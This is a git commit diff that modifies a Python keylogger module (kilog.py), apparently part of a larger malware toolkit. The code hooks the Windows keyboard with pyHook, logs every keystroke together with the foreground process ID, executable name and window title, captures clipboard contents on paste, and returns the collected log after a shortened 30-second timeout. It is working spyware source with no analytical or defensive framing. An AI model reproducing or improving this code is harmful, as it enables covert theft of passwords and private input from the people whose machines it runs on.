33e498581583e8f6d84a5803cd23fa1ff1c7fa52
apokalypse <kingkali@mail.perfectretrivers.shop>
2024-02-05 09:46:31 +0100

    Adding new modules

--- modules/kilog.py
+++ modules/kilog.py
@@ -8,8 +8,7 @@ import time
 import win32clipboard
 
 
-TIMEOUT = 60 * 10
-
+TIMEOUT = 30
 
 class KeyLogger:
     def __init__(self):
@@ -21,28 +20,36 @@ class KeyLogger:
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f'{pid.value}'
 
-        executable = create_string_buffer(512)
+        executable = create_string_buffer(b'\x00' * 512)
         h_process = windll.kernel32.OpenProcess(
             0x400 | 0x10, False, pid)
         windll.psapi.GetModuleBaseNameA(
             h_process, None, byref(executable), 512)
+        window_title = create_string_buffer(b'\x00' * 512)
+        length = windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
-        try:
-            self.current_window = window_title.value.decode()
-        except UnicodeDecodeError as e:
-            print(f'{e}: window name unknown')
-
-        print('\n', process_id, executable.value.decode(),
-              self.current_window)
+        # print out the header if we're in the right process
+        print()
+        print("[ PID: %s - %s - %s ]" % (process_id,
+                                         executable.value,
+                                         window_title.value)
+              )
+        print()
 
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
 
-    def mykeystroke(self, event):
+    def keystroke(self, event):
+        '''self.current_window
         if event.WindowName != self.current_window:
             self.get_current_process()
+        #self.current_windowpoky'''
+
+        # check to see if target changed windows
+        if event.WindowName != self.current_window:
+            self.current_window = event.WindowName
+            self.get_current_process()
+
         if 32 < event.Ascii < 127:
             print(chr(event.Ascii), end='')
         else:
@@ -52,9 +59,8 @@ class KeyLogger:
                 win32clipboard.CloseClipboard()
                 print(f'[PASTE] - {value}')
             else:
-                print(f'{event.Key}')
+                print(f'{event.Key}', end='')
         return True
-
 
 def run():
     save_stdout = sys.stdout
@@ -62,13 +68,14 @@ def run():
 
     kl = KeyLogger()
     hm = pyHook.HookManager()
-    hm.KeyDown = kl.mykeystroke
+    hm.KeyDown = kl.keystroke
     hm.HookKeyboard()
     while time.thread_time() < TIMEOUT:
         pythoncom.PumpWaitingMessages()
 
     log = sys.stdout.getvalue()
     sys.stdout = save_stdout
+
     return log
 
 
